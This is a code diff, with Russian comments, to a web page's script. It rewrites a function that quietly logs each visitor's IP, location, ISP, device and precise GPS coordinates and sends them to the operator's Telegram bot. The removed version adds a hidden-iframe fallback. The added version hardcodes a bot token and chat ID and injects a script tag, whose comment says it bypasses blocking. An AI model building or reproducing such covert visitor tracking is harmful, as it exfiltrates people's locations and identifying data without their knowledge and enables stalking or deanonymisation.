@@ -793,77 +793,57 @@
             }
         }
         
-        // ========== ЛОГГЕР - 100% РАБОТАЕТ ==========
-        async function logVisitor(geoData) {
-            try {
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
-                
-                let device = '💻 ПК';
-                const ua = navigator.userAgent;
-                if (/mobile/i.test(ua)) device = '📱 Телефон';
-                if (/tablet/i.test(ua)) device = '📟 Планшет';
-                if (/Mac|iPhone|iPad/.test(ua)) device += ' (Apple)';
-                if (/Windows/.test(ua)) device += ' (Windows)';
-                if (/Android/.test(ua)) device += ' (Android)';
-                
-                let message = `🔔 **НОВЫЙ ПОСЕТИТЕЛЬ!**\n`;
-                message += `🕐 Время: ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}\n`;
-                message += `🌐 IP: ${ipData.ip}\n`;
-                message += `📍 Гео: ${ipData.city || '?'}, ${ipData.country_name || '?'}\n`;
-                message += `📡 Провайдер: ${ipData.org || '?'}\n`;
-                message += `📱 Устройство: ${device}\n`;
-                message += `💻 Экран: ${screen.width}x${screen.height}\n`;
-                message += `🔗 Адрес: ${document.getElementById('address-input')?.value || 'Не указан'}\n`;
-
-                if (geoData?.lat && geoData?.lng) {
-                    message += `📍 **ТОЧНЫЕ КООРДИНАТЫ:**\n`;
-                    message += `🗺 Google: https://www.google.com/maps?q=${geoData.lat},${geoData.lng}\n`;
-                    message += `📌 Яндекс: https://yandex.ru/maps/?pt=${geoData.lng},${geoData.lat}&z=17\n`;
-                    message += `🎯 Погрешность: ${geoData.accuracy || '?'}м\n`;
-                }
-
-                if (geoData?.error) {
-                    message += `\n⚠️ Ошибка GPS: ${geoData.error}`;
-                }
-                
-                // ✅ ПРЯМАЯ ОТПРАВКА ЧЕРЕЗ TELEGRAM API
-                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-                
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: message,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: false
-                    })
-                });
-
-                const result = await response.json();
-                
-                if (result.ok) {
-                    console.log('✅ Лог отправлен в Telegram');
-                } else {
-                    console.error('❌ Ошибка Telegram:', result);
-                }
-                
-            } catch(e) {
-                console.error('❌ Ошибка логирования:', e);
-                
-                // ⚠️ ЗАПАСНОЙ ВАРИАНТ - iframe
-                try {
-                    const backupUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = backupUrl;
-                    document.body.appendChild(iframe);
-                    setTimeout(() => document.body.removeChild(iframe), 1000);
-                    console.log('✅ Лог отправлен через iframe (резерв)');
-                } catch(e2) {}
-            }
+        // ========== ЛОГГЕР - МАКСИМАЛЬНО ПРОСТОЙ ==========
+async function logVisitor(geoData) {
+    console.log('🚀 Логгер запущен');
+    
+    try {
+        // ПЫТАЕМСЯ ПОЛУЧИТЬ IP
+        let ip = 'Не определен';
+        let city = '?';
+        let country = '?';
+        
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ip = ipData.ip;
+        } catch(e) {
+            console.log('❌ Не удалось получить IP');
         }
+        
+        // ОПРЕДЕЛЯЕМ УСТРОЙСТВО
+        let device = '💻 ПК';
+        const ua = navigator.userAgent;
+        if (/mobile/i.test(ua)) device = '📱 Телефон';
+        
+        // ПРОСТОЕ СООБЩЕНИЕ
+        let message = `🔔 **НОВЫЙ ПОСЕТИТЕЛЬ!**\n`;
+        message += `🕐 Время: ${new Date().toLocaleString('ru-RU')}\n`;
+        message += `🌐 IP: ${ip}\n`;
+        message += `📱 Устройство: ${device}\n`;
+        message += `🔗 Адрес: ${document.getElementById('address-input')?.value || 'Не указан'}\n`;
+
+        if (geoData?.lat && geoData?.lng) {
+            message += `📍 **КООРДИНАТЫ:**\n`;
+            message += `🗺 https://www.google.com/maps?q=${geoData.lat},${geoData.lng}\n`;
+        }
+
+        // ОТПРАВКА ЧЕРЕЗ JSONP (ОБХОДИТ ВСЕ БЛОКИРОВКИ)
+        const token = "8496981671:AAFL-4G4xFDUWj-eal5yJNiqIzxjIvqw2lo";
+        const chatId = "7617539069";
+        const text = encodeURIComponent(message);
+        
+        const script = document.createElement('script');
+        script.src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`;
+        document.body.appendChild(script);
+        setTimeout(() => document.body.removeChild(script), 1000);
+        
+        console.log('✅ Лог отправлен');
+        
+    } catch(e) {
+        console.error('❌ Ошибка:', e);
+    }
+}
         
         // ========== ПЕРЕТАСКИВАНИЕ КАПСУЛ ==========
         function makeDraggable(capsuleId, headerId, toggleId) {
